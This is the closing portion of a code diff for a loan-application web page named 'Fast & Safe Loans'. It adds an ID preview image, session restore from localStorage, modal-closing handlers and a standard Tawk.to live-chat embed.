+  document.getElementById('idPhotoDisplay').src = 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="200" height="120" viewBox="0 0 200 120"%3E%3Crect width="200" height="120" fill="%23f5b80022"/%3E%3Ctext x="20" y="50" font-family="sans-serif" font-size="14" fill="%231e2329"%3E🪪 Fast & Safe Loans%3C/text%3E%3Ctext x="20" y="80" font-family="sans-serif" font-size="12" fill="%23666"%3EID: '+(CU?CU.id:'')+'%3C/text%3E%3C/svg%3E';
+  document.getElementById('idModal').style.display='flex';
+}
+function closeModal(id){ document.getElementById(id).style.display='none'; }
+
+// ========== SESSION ==========
+(function(){
+  let sid = localStorage.getItem('fsl_session');
+  if(sid){
+    let users=getUsers(), user=users.find(u=>u.id===sid);
+    if(user){ CU=user; document.getElementById('loginPage').classList.add('hide'); document.getElementById('mainApp').classList.remove('hide'); initApp(); }
+    else localStorage.removeItem('fsl_session');
+  }
+})();
+
+// close modals on outside click
+document.querySelectorAll('.modal').forEach(el=>{ el.addEventListener('click',function(e){ if(e.target===this) this.style.display='none'; }); });
+document.getElementById('securityOverlay').addEventListener('click',function(e){ if(e.target===this) closeSecurity(); });
+
+// Tawk.to live chat
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/6a397c2849e0e21d4954f33a/1jro8q0h2';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+</body>
+</html>
